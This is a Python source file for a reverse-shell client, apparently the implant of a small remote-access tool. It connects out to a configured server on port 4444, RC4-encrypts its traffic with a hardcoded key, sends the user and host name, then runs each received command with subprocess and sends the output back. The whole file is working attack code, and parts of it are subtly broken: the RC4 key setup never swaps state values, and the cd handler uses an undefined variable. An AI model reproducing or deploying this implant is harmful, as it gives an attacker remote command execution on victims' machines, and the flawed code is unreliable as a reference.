import os
import socket
import getpass as gp
import platform as pf
import subprocess as sp


class Config:
    DEBUG = True

    MAX_BUFF = 32768
    SRV_PORT = 4444
    SRV_ADDR = '127.0.0.1'
    RC4_KEY = 'alterego'


class RC4Context(object):
    STATE_SIZE = 256

    def __init__(self, key: bytes):
        aux = 0
        len_key = len(key)
        len_state = RC4Context.STATE_SIZE

        self.x = 0
        self.y = 0
        self.state = [i for i in range(len_state)]

        for i in range(len_state):
            aux = (aux + i + key[i % len_key]) % len_state

            self.state[aux] = self.state[aux]
            self.state[aux] = i

    def crypt(self, data: bytes) -> bytes:
        aux = 0
        data = bytearray(data)

        len_data = len(data)
        len_state = RC4Context.STATE_SIZE

        for i in range(len_data):
            self.x = (self.x + 1) % len_state;
            self.y = (self.y + self.state[self.x]) % len_state

            aux = self.state[self.x]
            self.state[self.x] = self.state[self.y]
            self.state[self.y] = aux

            data[i] ^= self.state[
                (self.state[self.x] + self.state[self.y]) % len_state
            ]

        return bytes(data)


class Connection(object):
    def __init__(self):
        self.rc4_ectx = RC4Context(Config.RC4_KEY.encode())
        self.rc4_dctx = RC4Context(Config.RC4_KEY.encode())

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((Config.SRV_ADDR, Config.SRV_PORT))

    def __str__(self):
        return f'{Config.SRV_ADDR}:{Config.SRV_PORT}'

    def authenticate(self) -> bool:
        pass

    def recv(self) -> bytes:
        return self.rc4_dctx.crypt(self.sock.recv(Config.MAX_BUFF))

    def send(self, data: bytes):
        self.sock.send(self.rc4_ectx.crypt(data))

    def close(self):
        self.sock.close()


class Builtin:
    def help():
        # Handled remotely
        pass

    def cd(s: str):
        os.chdir(rmt[1])

    def exit(c: Connection):
        c.close()
        exit(0)


if __name__ == '__main__':
    u = gp.getuser()
    h = socket.gethostname()

    if pf.system().lower() == 'windows':
        p = '>'
    else:
        p = '#' if u == 'root' else '$'

    prompt = lambda : f'{u}@{h}:{os.getcwd()}{p} '

    try:
        c = Connection()

    except Exception as x:
        if Config.DEBUG:
            print(f'{type(x).__name__}: {x}')

    if Config.DEBUG:
        print(f'[+] Connected to {c}')

    # First message is the prompt alone (later should include some info)
    lcl = prompt()

    while True:
        try:
            # Send the local buffer
            c.send(lcl.encode())

            # Receive remote buffer and split arguments into a list
            if not (rmt := c.recv().decode().split()):
                continue

            # Handle builtins
            if rmt[0] == 'cd':
                try:
                    Builtin.cd(rmt[1])
                    lcl = prompt()

                except Exception as x:
                    lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'

            elif rmt[0] == 'help':
                Builtin.help()

            elif rmt[0] == 'exit':
                Builtin.exit(c)

            # Execute subprocess and wait for it to finish
            else:
                try:
                    proc = sp.Popen(
                        rmt,
                        stdin = sp.PIPE, stdout = sp.PIPE, stderr = sp.PIPE
                    )

                    # Retrieve command output
                    out, err = proc.communicate()

                    lcl = f'{out.decode()}{err.decode()}' if (out or err) else ''

                    # Append prompt to message
                    r = proc.wait()
                    lcl += f'{r}:{prompt()}' if r else prompt()

                except FileNotFoundError:
                    lcl = f'[alter] Command not found\n{prompt()}'


        except Exception as x:
            lcl = f'[!] {type(x).__name__}: {x}\n{prompt()}'

        if Config.DEBUG:
            print(lcl)

    if Config.DEBUG:
        print('[-] Connection closed')
